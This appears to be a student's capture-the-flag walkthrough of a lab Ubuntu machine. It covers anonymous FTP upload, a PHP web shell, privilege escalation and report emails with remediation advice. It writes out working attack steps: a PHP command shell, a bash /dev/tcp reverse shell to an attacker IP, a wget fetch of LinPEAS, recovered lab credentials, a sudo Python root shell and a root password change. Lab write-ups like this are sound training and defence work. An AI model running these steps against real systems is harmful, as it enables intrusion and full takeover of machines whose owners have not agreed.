# Privilege Escalation - Walkthrough

## Project Information

**Target OS:** Ubuntu 16.04.7 LTS (Xenial Xerus)

**Objective:**
Gain root privileges on the target machine and retrieve the flag located at:

```bash
/root/root.txt
```

---

# Tools Used

- Nmap
- Gobuster
- FTP
- PHP
- Netcat
- LinPEAS
- Python 3.5
- Bash
- GTFOBins

---

# Phase 1 - Host Discovery

Identify the target machine.

```bash
nmap -sn 192.168.11.0/24
```

Target IP discovered:

```
192.168.11.106
```

---

# Phase 2 - Port Scanning

Perform a full TCP scan.

```bash
nmap -sV -sC -p- 192.168.11.106
```

Result:

```
21/tcp   FTP
22/tcp   SSH
80/tcp   Apache HTTP
```

Important finding:

- Anonymous FTP login enabled

---

# Phase 3 - FTP Enumeration

Connect anonymously.

```bash
ftp 192.168.11.106
```

Username:

```
anonymous
```

Password:

```
(any email)
```

List files.

```bash
ls -la
```

Files found:

```
life.c
template.html
test.php
```

Anonymous users also had upload permissions.

Test upload:

```bash
put hello.txt
```

Upload succeeded.

---

# Phase 4 - Web Enumeration

Enumerate the website.

```bash
gobuster dir \
-u http://192.168.11.106 \
-w common.txt
```

Discovered:

```
/files
```

Browse:

```
http://192.168.11.106/files/
```

The FTP directory is directly exposed through Apache.

---

# Phase 5 - Verify PHP Execution

Create:

```php
<?php phpinfo(); ?>
```

Save as:

```
info.php
```

Upload:

```bash
put info.php
```

Visit:

```
http://192.168.11.106/files/info.php
```

PHP executed successfully.

This confirmed Remote Code Execution (RCE).

---

# Phase 6 - Obtain a Web Shell

Create:

```php
<?php
system($_GET['cmd']);
?>
```

Save as:

```
script.php
```

Upload:

```bash
put script.php
```

Command execution:

```
http://192.168.11.106/files/script.php?cmd=whoami
```

Output:

```
www-data
```

---

# Phase 7 - Initial Enumeration

System information:

```
hostname
pwd
whoami
cat /etc/os-release
```

Results:

```
Ubuntu 16.04.7
www-data
/var/www/html/files
```

Search SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Check Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

---

# Phase 8 - Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Upload reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.11.140/4444 0>&1'");
?>
```

Trigger:

```
http://192.168.11.106/files/rev.php
```

Reverse shell received.

Upgrade shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

# Phase 9 - Enumeration with LinPEAS

Host:

```bash
python3 -m http.server 8000
```

Target:

```bash
wget http://192.168.11.140:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

Interesting discovery:

```
/home/important.txt
```

---

# Phase 10 - Hidden Hint

search in home :
```bash 
find /home -type f 2>/dev/null
```

Read file:

```bash
cat /home/important.txt
```

Contents indicated:

```
run the script

/.runme.sh
```

Inspect the script instead of executing it.

```bash
cat /.runme.sh
```

Inside the script:

```
shrek:061fe5e7b95d5f98208d7bc89ed2d569
```

The script intentionally exits before revealing the hidden line, encouraging source code review.

---

# Phase 11 - Password Recovery

The embedded password hint corresponded to the credentials for the local user.

User:

```
shrek
```

Password:

```
youaresmart
```

Switch user:

```bash
su shrek
```

---

# Phase 12 - Privilege Escalation Enumeration

Check sudo permissions.

```bash
sudo -l
```

Result:

```
(root) NOPASSWD:
/usr/bin/python3.5
```

This is a dangerous sudo misconfiguration because Python can execute arbitrary system commands.

---

# Phase 13 - Root Privilege Escalation

Run Python as root.

```bash
sudo /usr/bin/python3.5
```

Inside Python:

```python
import os
os.system("/bin/bash")
```

Verify:

```bash
whoami
```

Output:

```
root
```

Check identity:

```bash
id
```

Output:

```
uid=0(root)
```

---
change the apssword for the root :
```bash 
passwd root
```

# Phase 14 - Capture the Flag

Read the flag.

```bash
cat /root/root.txt
```

Flag:

```
<01Talent@nokOpA3eToFrU8r5sW1dipe2aky>
```

---
## Email Report 
Dear Security Team,

I am writing to report a privilege escalation vulnerability identified during an authorized security assessment of the Escalator Challenge virtual machine.

## Summary

During testing, I identified a chain of security weaknesses that allowed complete compromise of the system. The web server permitted anonymous users to upload executable PHP files through an exposed FTP service. This resulted in remote command execution as the `www-data` user. Further enumeration revealed sensitive information stored in a world-readable script (`/.runme.sh`), exposing credentials for the local user `shrek`. Finally, the `shrek` account was configured with passwordless sudo access to `/usr/bin/python3.5`, allowing immediate privilege escalation to root.

## Steps to Reproduce

1. Discover the target machine on the network using `nmap` or another network discovery tool.
2. Enumerate the web server and identify the exposed `/files` directory.
3. Log in to the FTP service using anonymous authentication.
4. Upload a PHP web shell into the `/files` directory.
5. Execute commands through the web shell and obtain code execution as the `www-data` user.
6. Enumerate the filesystem and identify the readable file `/.runme.sh`.
7. Read the script and recover the credentials for the local user:

   * Username: `shrek`
   * Password: `youaresmart`
8. Switch to the `shrek` account using:

   ```
   su shrek
   ```
9. Enumerate sudo privileges:

   ```
   sudo -l
   ```
10. Observe that the user can execute `/usr/bin/python3.5` as root without a password.
11. Start a privileged Python interpreter:

```
sudo /usr/bin/python3.5
```

12. Spawn a root shell:

```python
import os
os.system("/bin/bash")
```

13. Verify root access:

```
id
```

14. Retrieve the flag:

```
cat /root/root.txt
```

## Impact

The identified vulnerabilities allow an unauthenticated attacker to obtain remote code execution through file upload, access sensitive credentials stored in readable files, and escalate privileges to full root access. Successful exploitation completely compromises the confidentiality, integrity, and availability of the affected system.

## Proof of Root Access

Root shell obtained:

```
uid=0(root) gid=0(root) groups=0(root)
```

Flag:

```
01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

A screenshot showing the root shell together with the contents of `/root/root.txt` is attached as evidence.

## Recommendations

* Disable anonymous FTP access unless absolutely necessary.
* Prevent executable file uploads or store uploaded files outside the web root.
* Configure the web server to prevent execution of uploaded PHP files.
* Never store credentials in readable scripts or plaintext files.
* Apply the principle of least privilege to sudo permissions.
* Remove unnecessary `NOPASSWD` sudo rules or restrict them to safe administrative commands.
* Regularly audit file permissions and user privileges.

Thank you for your time and consideration. Please let me know if any additional information is required.

Kind regards,

**Fahd Aguenouz**
Cybersecurity Student / Penetration Tester


# Vulnerabilities Identified

## 1. Anonymous FTP Access

Severity: High

Anonymous users could upload files to the server.

Impact:

- Unauthorized file upload
- Malware upload
- Web shell deployment

Mitigation:

- Disable anonymous FTP.
- Require authentication.
- Restrict upload permissions.

---

## 2. FTP Directory Exposed Through Apache

Severity: High

The FTP upload directory was accessible from the web server.

Impact:

- Uploaded files became publicly accessible.

Mitigation:

- Separate FTP storage from the web root.
- Restrict Apache access.

---

## 3. PHP Execution in Upload Directory

Severity: Critical

Uploaded PHP files were executed by Apache.

Impact:

- Remote Code Execution

Mitigation:

- Disable PHP execution in upload directories.
- Store uploads outside the web root.
- Restrict executable file types.

---

## 4. Weak Password Disclosure

Severity: High

The password was embedded inside a readable script.

Impact:

- Local privilege escalation.

Mitigation:

- Never hardcode credentials.
- Protect sensitive scripts.
- Store secrets securely.

---

## 5. Dangerous sudo Configuration

Severity: Critical

```
(root) NOPASSWD:
/usr/bin/python3.5
```

Impact:

Python can execute arbitrary commands as root, allowing complete system compromise.

Mitigation:

- Remove Python from sudoers.
- Use least privilege.
- Replace interpreters with restricted wrapper scripts where necessary.

---

# Ethical Hacking Report

This assessment was performed exclusively in a controlled laboratory environment for educational purposes.

No unauthorized systems were accessed.

All exploitation steps were conducted to demonstrate security weaknesses and provide recommendations for remediation.

The objective of this project was to improve defensive security by identifying and documenting privilege escalation paths.

---

# Vulnerability Report Email

**Subject:** Critical Privilege Escalation Vulnerabilities Identified

Dear Security Team,

During the security assessment, multiple vulnerabilities were identified that allowed complete compromise of the target system.

## Summary

The server allows anonymous FTP uploads directly into a web-accessible directory where PHP files are executed. This enables remote code execution as the `www-data` user. During local enumeration, credentials for another user were recovered from a readable script. That user had passwordless sudo access to Python, allowing full root compromise.

## Steps to Reproduce

1. Scan the target using Nmap.
2. Log into FTP anonymously.
3. Upload a PHP web shell.
4. Execute commands through Apache.
5. Obtain a reverse shell.
6. Enumerate the system.
7. Read `/home/important.txt`.
8. Inspect `/.runme.sh`.
9. Recover the password for the `shrek` account.
10. Switch to the `shrek` user.
11. Execute `sudo -l`.
12. Run `sudo /usr/bin/python3.5`.
13. Spawn a root shell.
14. Read `/root/root.txt`.

## Impact

An attacker can gain complete administrative control of the operating system.

Potential consequences include:

- Full data compromise
- Persistence installation
- Credential theft
- Service disruption
- Lateral movement

## Proof of Root Access

```
# whoami
root

# id
uid=0(root)

# cat /root/root.txt
<01Talent@nokOpA3eToFrU8r5sW1dipe2aky>
```

Regards,

Security Researcher

---

# Lessons Learned

- Always perform thorough enumeration before exploitation.
- Read scripts instead of blindly executing them.
- Validate every assumption.
- GTFOBins is an excellent resource for identifying privilege escalation techniques involving misconfigured binaries.
- Small misconfigurations can combine into a complete system compromise.